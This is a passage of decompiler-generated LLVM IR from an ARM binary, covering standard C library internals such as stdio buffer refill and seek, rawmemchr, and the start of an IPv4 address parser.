  store i32 %v4_1ee04, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1ee00, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1ee10 = sub i32 %v1_1ee10, %v4_1ee04
  store i32 %v2_1ee10, i32* %r3.global-to-local, align 4
  %v1_1ee14 = inttoptr i32 %arg2 to i32*
  %v2_1ee14 = load i32, i32* %v1_1ee14, align 4
  store i32 %v2_1ee14, i32* %r0.global-to-local, align 4
  %v3_1ee14 = add i32 %arg2, 4
  %v4_1ee14 = inttoptr i32 %v3_1ee14 to i32*
  %v5_1ee14 = load i32, i32* %v4_1ee14, align 4
  %v2_1ee18 = add i32 %storemerge, %v2_1ee10
  store i32 %v2_1ee18, i32* %r4.global-to-local, align 4
  %v2_1ee1c = sub i32 %v2_1ee14, %v2_1ee18
  store i32 %v2_1ee1c, i32* %r2.global-to-local, align 4
  %v2_1ee20 = and i32 %v2_1ee18, 1073741824
  %v3_1ee20 = icmp ne i32 %v2_1ee20, 0
  %v4_1ee20 = ashr i32 %v2_1ee18, 31
  %v6_1ee20 = icmp eq i1 %v3_1ee20, false
  %v7_1ee20 = sub i32 %v5_1ee14, %v4_1ee20
  %v9_1ee20 = sext i1 %v6_1ee20 to i32
  %v10_1ee20 = add i32 %v7_1ee20, %v9_1ee20
  store i32 %v10_1ee20, i32* %r3.global-to-local, align 4
  %v2_1ee24 = sub i32 %v10_1ee20, %v5_1ee14
  %v4_1ee24 = xor i32 %v10_1ee20, %v5_1ee14
  %v5_1ee24 = xor i32 %v2_1ee24, %v10_1ee20
  %v6_1ee24 = and i32 %v5_1ee24, %v4_1ee24
  %v7_1ee24 = icmp slt i32 %v6_1ee24, 0
  %v8_1ee24 = icmp slt i32 %v2_1ee24, 0
  %v9_1ee24 = icmp eq i32 %v10_1ee20, %v5_1ee14
  store i32 %v2_1ee1c, i32* %v1_1ee14, align 4
  %v5_1ee28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1ee28, i32* %v4_1ee14, align 4
  %v3_1ee2c = xor i1 %v8_1ee24, %v7_1ee24
  %v4_1ee2c = or i1 %v9_1ee24, %v3_1ee2c
  br i1 %v4_1ee2c, label %dec_label_pc_1ee30, label %dec_label_pc_1ee3c

dec_label_pc_1ee30:                               ; preds = %bb13
  br i1 %v9_1ee24, label %dec_label_pc_1ee34, label %dec_label_pc_1ee40thread-pre-split

dec_label_pc_1ee34:                               ; preds = %dec_label_pc_1ee30
  %v0_1ee34 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ee34 = load i32, i32* %r0.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v0_1ee34, %v1_1ee34
  br i1 %tmp17, label %dec_label_pc_1ee3c, label %dec_label_pc_1ee40thread-pre-split

dec_label_pc_1ee3c:                               ; preds = %dec_label_pc_1ee34, %bb13
  %v0_1ee3c = load i32, i32* %r4.global-to-local, align 4
  %v1_1ee3c = sub i32 0, %v0_1ee3c
  store i32 %v1_1ee3c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ee40

dec_label_pc_1ee40thread-pre-split:               ; preds = %dec_label_pc_1ee34, %dec_label_pc_1ee30
  %v0_1ee40.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ee40

dec_label_pc_1ee40:                               ; preds = %dec_label_pc_1ee40thread-pre-split, %dec_label_pc_1ee3c
  %v0_1ee40 = phi i32 [ %v0_1ee40.pr, %dec_label_pc_1ee40thread-pre-split ], [ %v1_1ee3c, %dec_label_pc_1ee3c ]
  %v1_1ee40 = icmp slt i32 %v0_1ee40, 0
  br i1 %v1_1ee40, label %dec_label_pc_1ee48, label %dec_label_pc_1ee64

dec_label_pc_1ee48:                               ; preds = %dec_label_pc_1ee40
  store i32 78384, i32* %r3.global-to-local, align 4
  %v0_1ee4c = call i32 @__aeabi_read_tp()
  store i32 %v0_1ee4c, i32* %r0.global-to-local, align 4
  %v3_1ee50 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1ee50 = sext i16 %v3_1ee50 to i32
  store i32 %v4_1ee50, i32* %r3.global-to-local, align 4
  store i32 75, i32* %r2.global-to-local, align 4
  %v3_1ee58 = add i32 %v4_1ee50, %v0_1ee4c
  %v4_1ee58 = inttoptr i32 %v3_1ee58 to i32*
  store i32 75, i32* %v4_1ee58, align 4
  %v0_1ee64.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ee64

dec_label_pc_1ee60:                               ; preds = %dec_label_pc_1eddc, %dec_label_pc_1edd4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1ee64

dec_label_pc_1ee64:                               ; preds = %dec_label_pc_1ee40, %dec_label_pc_1ee48, %dec_label_pc_1ee60
  %v0_1ee64 = phi i32 [ %v0_1ee40, %dec_label_pc_1ee40 ], [ %v0_1ee64.pre, %dec_label_pc_1ee48 ], [ -1, %dec_label_pc_1ee60 ]
  store i32 %v0_1ee64, i32* %r0.global-to-local, align 4
  %v2_1ee68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ee68, i32* @r4, align 4
  ret i32 %v0_1ee64

; uselistorder directives
  uselistorder i32 %v0_1ee64, { 1, 0 }
  uselistorder i1 %v9_1ee24, { 1, 0 }
  uselistorder i32 %v2_1ee24, { 1, 0 }
  uselistorder i32 %v10_1ee20, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1ee14, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 75, { 0, 3, 1, 2 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1ee64, { 2, 1, 0 }
  uselistorder label %bb13, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1ee74 = load i32, i32* @r4, align 4
  store i32 %v3_1ee74, i32* %stack_var_-8, align 4
  %v1_1ee78 = add i32 %arg1, 8
  %v1_1ee7c = inttoptr i32 %v1_1ee78 to i32*
  %v2_1ee7c = load i32, i32* %v1_1ee7c, align 4
  store i32 %v2_1ee7c, i32* @r1, align 4
  %v3_1ee7c = add i32 %arg1, 12
  %v4_1ee7c = inttoptr i32 %v3_1ee7c to i32*
  %v5_1ee7c = load i32, i32* %v4_1ee7c, align 4
  %v2_1ee80 = sub i32 %v5_1ee7c, %v2_1ee7c
  store i32 %v2_1ee80, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1ee88 = inttoptr i32 %arg1 to i16*
  %v4_1ee88 = call i32 @__stdio_READ(i16* %v3_1ee88, i32 %v2_1ee7c, i32 %v2_1ee80)
  %v0_1ee8c = load i32, i32* @r4, align 4
  %v1_1ee8c = add i32 %v0_1ee8c, 8
  %v2_1ee8c = inttoptr i32 %v1_1ee8c to i32*
  %v3_1ee8c = load i32, i32* %v2_1ee8c, align 4
  store i32 %v3_1ee8c, i32* %r2.global-to-local, align 4
  %v2_1ee90 = add i32 %v3_1ee8c, %v4_1ee88
  %v2_1ee94 = add i32 %v0_1ee8c, 20
  %v3_1ee94 = inttoptr i32 %v2_1ee94 to i32*
  store i32 %v2_1ee90, i32* %v3_1ee94, align 4
  %v0_1ee98 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ee98 = load i32, i32* @r4, align 4
  %v2_1ee98 = add i32 %v1_1ee98, 16
  %v3_1ee98 = inttoptr i32 %v2_1ee98 to i32*
  store i32 %v0_1ee98, i32* %v3_1ee98, align 4
  %v2_1ee9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1ee9c, i32* @r4, align 4
  ret i32 %v4_1ee88

; uselistorder directives
  uselistorder i32 %v4_1ee88, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1eea4 = load i32, i32* @r4, align 4
  store i32 %v3_1eea4, i32* %stack_var_-12, align 4
  %v0_1eea8 = load i32, i32* @r0, align 4
  %v1_1eea8 = inttoptr i32 %v0_1eea8 to i16*
  %v2_1eea8 = load i16, i16* %v1_1eea8, align 2
  %v3_1eea8 = zext i16 %v2_1eea8 to i32
  store i32 %v3_1eea8, i32* %r3.global-to-local, align 4
  %v0_1eeac = load i32, i32* @r1, align 4
  %v2_1eeac = and i32 %v0_1eeac, %v3_1eea8
  %v4_1eeac = icmp eq i32 %v2_1eeac, 0
  store i32 %v0_1eea8, i32* @r4, align 4
  br i1 %v4_1eeac, label %dec_label_pc_1eebc, label %dec_label_pc_1eecc

dec_label_pc_1eebc:                               ; preds = %entry
  %v1_1eebc = and i32 %v3_1eea8, 2176
  %v2_1eebc = icmp eq i32 %v1_1eebc, 0
  br i1 %v2_1eebc, label %dec_label_pc_1eec4, label %dec_label_pc_1eed8

dec_label_pc_1eec4:                               ; preds = %dec_label_pc_1eebc
  %v2_1eec4 = or i32 %v0_1eeac, %v3_1eea8
  store i32 %v2_1eec4, i32* %r3.global-to-local, align 4
  %v1_1eec8 = trunc i32 %v2_1eec4 to i16
  store i16 %v1_1eec8, i16* %v1_1eea8, align 2
  %v0_1eecc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1eecc

dec_label_pc_1eecc:                               ; preds = %entry, %dec_label_pc_1eec4
  %v0_1eecc = phi i32 [ %v0_1eea8, %entry ], [ %v0_1eecc.pre, %dec_label_pc_1eec4 ]
  %v1_1eecc = inttoptr i32 %v0_1eecc to i16*
  %v2_1eecc = load i16, i16* %v1_1eecc, align 2
  %v3_1eecc = zext i16 %v2_1eecc to i32
  store i32 %v3_1eecc, i32* %r3.global-to-local, align 4
  %v1_1eed0 = and i32 %v3_1eecc, 16
  store i32 %v1_1eed0, i32* %r5.global-to-local, align 4
  %v2_1eed0 = icmp eq i32 %v1_1eed0, 0
  br i1 %v2_1eed0, label %dec_label_pc_1ef00, label %dec_label_pc_1eed8

dec_label_pc_1eed8:                               ; preds = %dec_label_pc_1eebc, %dec_label_pc_1eecc
  store i32 78240, i32* %r3.global-to-local, align 4
  %v0_1eedc = call i32 @__aeabi_read_tp()
  store i32 %v0_1eedc, i32* %r0.global-to-local, align 4
  %v3_1eee0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1eee0 = sext i16 %v3_1eee0 to i32
  store i32 %v4_1eee0, i32* %r3.global-to-local, align 4
  %v3_1eee8 = add i32 %v4_1eee0, %v0_1eedc
  %v4_1eee8 = inttoptr i32 %v3_1eee8 to i32*
  store i32 9, i32* %v4_1eee8, align 4
  br label %dec_label_pc_1eeec

dec_label_pc_1eeec:                               ; preds = %dec_label_pc_1ef08, %dec_label_pc_1eed8
  %v0_1eeec = load i32, i32* @r4, align 4
  %v1_1eeec = inttoptr i32 %v0_1eeec to i16*
  %v2_1eeec = load i16, i16* %v1_1eeec, align 2
  %v3_1eeec = zext i16 %v2_1eeec to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1eef4 = or i32 %v3_1eeec, 8
  store i32 %v1_1eef4, i32* %r3.global-to-local, align 4
  %v1_1eef8 = trunc i32 %v1_1eef4 to i16
  store i16 %v1_1eef8, i16* %v1_1eeec, align 2
  %v1_1ef40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ef38

dec_label_pc_1ef00:                               ; preds = %dec_label_pc_1eecc
  %v1_1ef00 = and i32 %v3_1eecc, 64
  %v2_1ef00 = icmp eq i32 %v1_1ef00, 0
  br i1 %v2_1ef00, label %dec_label_pc_1ef28, label %dec_label_pc_1ef08

dec_label_pc_1ef08:                               ; preds = %dec_label_pc_1ef00
  %v0_1ef08 = call i32 @__stdio_wcommit()
  store i32 %v0_1ef08, i32* %r0.global-to-local, align 4
  %v2_1ef0c = icmp eq i32 %v0_1ef08, 0
  br i1 %v2_1ef0c, label %dec_label_pc_1ef14, label %dec_label_pc_1eeec

dec_label_pc_1ef14:                               ; preds = %dec_label_pc_1ef08
  %v0_1ef14 = load i32, i32* @r4, align 4
  %v1_1ef14 = inttoptr i32 %v0_1ef14 to i16*
  %v2_1ef14 = load i16, i16* %v1_1ef14, align 2
  %v3_1ef14 = zext i16 %v2_1ef14 to i32
  store i32 %v3_1ef14, i32* %r3.global-to-local, align 4
  %v1_1ef18 = add i32 %v0_1ef14, 8
  %v2_1ef18 = inttoptr i32 %v1_1ef18 to i32*
  %v3_1ef18 = load i32, i32* %v2_1ef18, align 4
  %v1_1ef1c = and i32 %v3_1ef14, 65471
  store i32 %v1_1ef1c, i32* %r3.global-to-local, align 4
  %v2_1ef20 = add i32 %v0_1ef14, 28
  %v3_1ef20 = inttoptr i32 %v2_1ef20 to i32*
  store i32 %v3_1ef18, i32* %v3_1ef20, align 4
  %v0_1ef24 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ef24 = trunc i32 %v0_1ef24 to i16
  %v2_1ef24 = load i32, i32* @r4, align 4
  %v3_1ef24 = inttoptr i32 %v2_1ef24 to i16*
  store i16 %v1_1ef24, i16* %v3_1ef24, align 2
  %v0_1ef28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ef28

dec_label_pc_1ef28:                               ; preds = %dec_label_pc_1ef00, %dec_label_pc_1ef14
  %v2_1ef30 = phi i32 [ %v0_1eecc, %dec_label_pc_1ef00 ], [ %v0_1ef28.pre, %dec_label_pc_1ef14 ]
  %v1_1ef28 = inttoptr i32 %v2_1ef30 to i16*
  %v2_1ef28 = load i16, i16* %v1_1ef28, align 2
  %v3_1ef28 = zext i16 %v2_1ef28 to i32
  %v1_1ef2c = or i32 %v3_1ef28, 1
  store i32 %v1_1ef2c, i32* %r3.global-to-local, align 4
  %v1_1ef30 = trunc i32 %v1_1ef2c to i16
  store i16 %v1_1ef30, i16* %v1_1ef28, align 2
  %v0_1ef34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1ef34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ef38

dec_label_pc_1ef38:                               ; preds = %dec_label_pc_1eeec, %dec_label_pc_1ef28
  %v1_1ef40 = phi i32 [ %v1_1ef40.pre, %dec_label_pc_1eeec ], [ %v0_1ef34, %dec_label_pc_1ef28 ]
  %v2_1ef3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ef3c, i32* @r4, align 4
  ret i32 %v1_1ef40

; uselistorder directives
  uselistorder i32 %v3_1eea8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1ef38, { 1, 0 }
  uselistorder label %dec_label_pc_1ef28, { 1, 0 }
  uselistorder label %dec_label_pc_1eed8, { 1, 0 }
  uselistorder label %dec_label_pc_1eecc, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1ef54 = load i32, i32* %arg2, align 4
  %v3_1ef54 = add i32 %tmp, 4
  %v4_1ef54 = inttoptr i32 %v3_1ef54 to i32*
  %v5_1ef54 = load i32, i32* %v4_1ef54, align 4
  %v1_1ef58 = add i32 %arg1, 4
  %v2_1ef58 = inttoptr i32 %v1_1ef58 to i32*
  %v3_1ef58 = load i32, i32* %v2_1ef58, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1ef60 = call i32 @__GI_lseek64(i32 %v3_1ef58, i32 %tmp, i32 %v2_1ef54, i32 %v5_1ef54)
  %v1_1ef64 = icmp slt i32* %arg2, null
  br i1 %v1_1ef64, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1ef6c5 = load i32, i32* @r4, align 4
  %v4_1ef6c6 = inttoptr i32 %v3_1ef6c5 to i32*
  store i32 %v4_1ef60, i32* %v4_1ef6c6, align 4
  %v6_1ef6c7 = add i32 %v3_1ef6c5, 4
  %v7_1ef6c8 = inttoptr i32 %v6_1ef6c7 to i32*
  store i32 %tmp, i32* %v7_1ef6c8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1ef60, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1ef88 = urem i32 %arg1, 256
  %v0_1efa02 = load i32, i32* @r0, align 4
  %v1_1efa03 = urem i32 %v0_1efa02, 4
  %v2_1efa04 = icmp eq i32 %v1_1efa03, 0
  br i1 %v2_1efa04, label %dec_label_pc_1efa8, label %dec_label_pc_1ef90

dec_label_pc_1ef90:                               ; preds = %entry, %dec_label_pc_1ef9c
  %v0_1ef9c = phi i32 [ %v1_1ef9c, %dec_label_pc_1ef9c ], [ %v0_1efa02, %entry ]
  %v1_1ef90 = inttoptr i32 %v0_1ef9c to i8*
  %v2_1ef90 = load i8, i8* %v1_1ef90, align 1
  %v3_1ef90 = zext i8 %v2_1ef90 to i32
  %v9_1ef94 = icmp eq i32 %v3_1ef90, %v1_1ef88
  br i1 %v9_1ef94, label %dec_label_pc_1f024, label %dec_label_pc_1ef9c

dec_label_pc_1ef9c:                               ; preds = %dec_label_pc_1ef90
  %v1_1ef9c = add i32 %v0_1ef9c, 1
  %v1_1efa0 = urem i32 %v1_1ef9c, 4
  %v2_1efa0 = icmp eq i32 %v1_1efa0, 0
  br i1 %v2_1efa0, label %dec_label_pc_1efa8, label %dec_label_pc_1ef90

dec_label_pc_1efa8:                               ; preds = %dec_label_pc_1ef9c, %entry
  %v0_1efac = phi i32 [ %v0_1efa02, %entry ], [ %v1_1ef9c, %dec_label_pc_1ef9c ]
  %v4_1efa8 = mul nuw nsw i32 %v1_1ef88, 256
  %v5_1efa8 = or i32 %v4_1efa8, %v1_1ef88
  %v4_1efb0 = mul i32 %v5_1efa8, 65536
  %v5_1efb0 = or i32 %v4_1efb0, %v5_1efa8
  br label %dec_label_pc_1efb4

dec_label_pc_1efb4:                               ; preds = %dec_label_pc_1f014, %dec_label_pc_1efb4, %dec_label_pc_1efa8
  %v0_1eff8 = phi i32 [ %v0_1efac, %dec_label_pc_1efa8 ], [ %v4_1efb4, %dec_label_pc_1efb4 ], [ %v4_1efb4, %dec_label_pc_1f014 ]
  %v1_1efb4 = inttoptr i32 %v0_1eff8 to i32*
  %v2_1efb4 = load i32, i32* %v1_1efb4, align 4
  %v4_1efb4 = add i32 %v0_1eff8, 4
  %v2_1efbc = xor i32 %v2_1efb4, %v5_1efb0
  %v2_1efc0 = add i32 %v2_1efbc, 2130640639
  %v1_1efc8 = sub i32 -1, %v2_1efbc
  %v2_1efcc = xor i32 %v2_1efc0, %v1_1efc8
  %v2_1efd0 = and i32 %v2_1efcc, -2130640640
  %v2_1efd4 = icmp eq i32 %v2_1efd0, 0
  br i1 %v2_1efd4, label %dec_label_pc_1efb4, label %dec_label_pc_1efdc

dec_label_pc_1efdc:                               ; preds = %dec_label_pc_1efb4
  %v2_1efdc = inttoptr i32 %v0_1eff8 to i8*
  %v3_1efdc = load i8, i8* %v2_1efdc, align 1
  %v4_1efdc = zext i8 %v3_1efdc to i32
  %v9_1efe4 = icmp eq i32 %v4_1efdc, %v1_1ef88
  %v1_1efe8 = add i32 %v0_1eff8, 3
  br i1 %v9_1efe4, label %dec_label_pc_1f024, label %dec_label_pc_1eff0

dec_label_pc_1eff0:                               ; preds = %dec_label_pc_1efdc
  %v1_1eff0 = add i32 %v0_1eff8, 1
  %v2_1eff0 = inttoptr i32 %v1_1eff0 to i8*
  %v3_1eff0 = load i8, i8* %v2_1eff0, align 1
  %v4_1eff0 = zext i8 %v3_1eff0 to i32
  %v9_1eff4 = icmp eq i32 %v4_1eff0, %v1_1ef88
  br i1 %v9_1eff4, label %bb, label %dec_label_pc_1f004

bb:                                               ; preds = %dec_label_pc_1eff0
  br label %dec_label_pc_1f024

dec_label_pc_1f004:                               ; preds = %dec_label_pc_1eff0
  %v1_1f004 = add i32 %v0_1eff8, 2
  %v2_1f004 = inttoptr i32 %v1_1f004 to i8*
  %v3_1f004 = load i8, i8* %v2_1f004, align 1
  %v4_1f004 = zext i8 %v3_1f004 to i32
  %v9_1f008 = icmp eq i32 %v4_1f004, %v1_1ef88
  br i1 %v9_1f008, label %dec_label_pc_1f024, label %dec_label_pc_1f014

dec_label_pc_1f014:                               ; preds = %dec_label_pc_1f004
  %v2_1f014 = inttoptr i32 %v1_1efe8 to i8*
  %v3_1f014 = load i8, i8* %v2_1f014, align 1
  %v4_1f014 = zext i8 %v3_1f014 to i32
  %v9_1f018 = icmp eq i32 %v4_1f014, %v1_1ef88
  br i1 %v9_1f018, label %dec_label_pc_1f020, label %dec_label_pc_1efb4

dec_label_pc_1f020:                               ; preds = %dec_label_pc_1f014
  br label %dec_label_pc_1f024

dec_label_pc_1f024:                               ; preds = %dec_label_pc_1ef90, %dec_label_pc_1f004, %dec_label_pc_1efdc, %bb, %dec_label_pc_1f020
  %v1_1f028 = phi i32 [ %v1_1efe8, %dec_label_pc_1f020 ], [ %v1_1eff0, %bb ], [ %v1_1f004, %dec_label_pc_1f004 ], [ %v0_1eff8, %dec_label_pc_1efdc ], [ %v0_1ef9c, %dec_label_pc_1ef90 ]
  ret i32 %v1_1f028

; uselistorder directives
  uselistorder i32 %v4_1efb4, { 1, 0 }
  uselistorder i32 %v0_1eff8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1efa8, { 1, 0 }
  uselistorder i32 %v1_1ef9c, { 1, 0, 2 }
  uselistorder i32 %v0_1efa02, { 2, 1, 0 }
  uselistorder i32 %v1_1ef88, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 2130640639, { 6, 2, 7, 8, 3, 0, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_1f024, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1ef90, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1f034 = load i32, i32* @r4, align 4
  %v6_1f034 = load i32, i32* @r5, align 4
  %v15_1f034 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1f04c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1f04c, i32* @r1, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1f0c41 = load i32, i32* @r0, align 4
  %v1_1f0c42 = inttoptr i32 %v0_1f0c41 to i8*
  %v2_1f0c43 = load i8, i8* %v1_1f0c42, align 1
  %v3_1f0c44 = zext i8 %v2_1f0c43 to i32
  store i32 %v3_1f0c44, i32* @r3, align 4
  %v2_1f0c85 = icmp eq i8 %v2_1f0c43, 0
  store i1 %v2_1f0c85, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f0c85, label %dec_label_pc_1f0d4, label %dec_label_pc_1f064

dec_label_pc_1f064:                               ; preds = %entry, %dec_label_pc_1f0c4.backedge
  %v0_1f068 = phi i32 [ %v0_1f0c4, %dec_label_pc_1f0c4.backedge ], [ %v0_1f0c41, %entry ]
  %v0_1f0a0 = phi i32 [ %v3_1f0c4, %dec_label_pc_1f0c4.backedge ], [ %v3_1f0c44, %entry ]
  %v2_1f074.in = phi i32 [ %v3_1f0c4, %dec_label_pc_1f0c4.backedge ], [ %v3_1f0c44, %entry ]
  %v2_1f074 = add nsw i32 %v2_1f074.in, -48
  %v2_1f064 = icmp ugt i32 %v2_1f074, 8
  %v7_1f064 = icmp eq i32 %v2_1f074, 9
  store i1 %v7_1f064, i1* %cpsr_z.global-to-local, align 1
  %v1_1f068 = add i32 %v0_1f068, 1
  store i32 %v1_1f068, i32* %r0.global-to-local, align 4
  %v2_1f06c = xor i1 %v7_1f064, true
  %v3_1f06c = and i1 %v2_1f064, %v2_1f06c
  br i1 %v3_1f06c, label %dec_label_pc_1f0a0, label %dec_label_pc_1f070

dec_label_pc_1f070:                               ; preds = %dec_label_pc_1f064
  %v0_1f070 = load i32, i32* @r1, align 4
  %v1_1f070 = inttoptr i32 %v0_1f070 to i8*
  %v2_1f070 = load i8, i8* %v1_1f070, align 1
  %v3_1f070 = zext i8 %v2_1f070 to i32
  %v0_1f074 = load i32, i32* %r7.global-to-local, align 4
  %v3_1f074 = mul i32 %v0_1f074, %v3_1f070
  %v4_1f074 = add i32 %v3_1f074, %v2_1f074
  store i32 %v4_1f074, i32* @r3, align 4
  %v2_1f078 = icmp ugt i32 %v4_1f074, 254
  %v7_1f078 = icmp eq i32 %v4_1f074, 255
  store i1 %v7_1f078, i1* %cpsr_z.global-to-local, align 1
  %v2_1f07c = xor i1 %v7_1f078, true
  %v3_1f07c = and i1 %v2_1f078, %v2_1f07c
  br i1 %v3_1f07c, label %dec_label_pc_1f0f8, label %dec_label_pc_1f080

dec_label_pc_1f080:                               ; preds = %dec_label_pc_1f070
  %v0_1f080 = load i32, i32* @lr, align 4
  %v2_1f080 = icmp eq i32 %v0_1f080, 0
  store i1 %v2_1f080, i1* %cpsr_z.global-to-local, align 1
  %v1_1f084 = trunc i32 %v4_1f074 to i8
  store i8 %v1_1f084, i8* %v1_1f070, align 1
  %v0_1f088 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1f088, label %dec_label_pc_1f08c, label %dec_label_pc_1f0c4.backedge

dec_label_pc_1f08c:                               ; preds = %dec_label_pc_1f080
  %v0_1f08c = load i32, i32* @ip, align 4
  %v1_1f08c = add i32 %v0_1f08c, 1
  store i32 %v1_1f08c, i32* @ip, align 4
  %v7_1f090 = icmp eq i32 %v1_1f08c, 4
  store i1 %v7_1f090, i1* %cpsr_z.global-to-local, align 1
  %v0_1f094 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1f094, i32* @lr, align 4
  %v8_1f098 = icmp sgt i32 %v1_1f08c, 4
  br i1 %v8_1f098, label %dec_label_pc_1f0f8, label %dec_label_pc_1f0c4.backedge

dec_label_pc_1f0a0:                               ; preds = %dec_label_pc_1f064
  %v7_1f0a0 = icmp eq i32 %v0_1f0a0, 46
  %v1_1f0a8 = load i32, i32* @lr, align 4
  %v2_1f0a8 = urem i32 %v1_1f0a8, 2
  %storemerge12 = select i1 %v7_1f0a0, i32 %v2_1f0a8, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1f0ac = icmp eq i32 %storemerge12, 0
  store i1 %v2_1f0ac, i1* %cpsr_z.global-to-local, align 1
  %v0_1f0b0 = load i32, i32* @r5, align 4
  store i32 %v0_1f0b0, i32* @lr, align 4
  br i1 %v2_1f0ac, label %dec_label_pc_1f0f8, label %dec_label_pc_1f0b8

dec_label_pc_1f0b8:                               ; preds = %dec_label_pc_1f0a0
  %v0_1f0b8 = load i32, i32* @ip, align 4
  %v7_1f0b8 = icmp eq i32 %v0_1f0b8, 4
  store i1 %v7_1f0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1f0b8, label %dec_label_pc_1f0f8, label %dec_label_pc_1f0c0

dec_label_pc_1f0c0:                               ; preds = %dec_label_pc_1f0b8
  %v1_1f0c0 = trunc i32 %v0_1f0b0 to i8
  %v2_1f0c0 = load i32, i32* @r1, align 4
  %v3_1f0c0 = add i32 %v2_1f0c0, 1
  %v4_1f0c0 = inttoptr i32 %v3_1f0c0 to i8*
  store i8 %v1_1f0c0, i8* %v4_1f0c0, align 1
  %v5_1f0c0 = load i32, i32* @r1, align 4
  %v6_1f0c0 = add i32 %v5_1f0c0, 1
  store i32 %v6_1f0c0, i32* @r1, align 4
  br label %dec_label_pc_1f0c4.backedge

dec_label_pc_1f0c4.backedge:                      ; preds = %dec_label_pc_1f0c0, %dec_label_pc_1f080, %dec_label_pc_1f08c
  %v0_1f0c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1f0c4 = inttoptr i32 %v0_1f0c4 to i8*
  %v2_1f0c4 = load i8, i8* %v1_1f0c4, align 1
  %v3_1f0c4 = zext i8 %v2_1f0c4 to i32
  store i32 %v3_1f0c4, i32* @r3, align 4
  %v2_1f0c8 = icmp eq i8 %v2_1f0c4, 0
  store i1 %v2_1f0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1f0c8, label %dec_label_pc_1f0c4.dec_label_pc_1f0d4_crit_edge, label %dec_label_pc_1f064

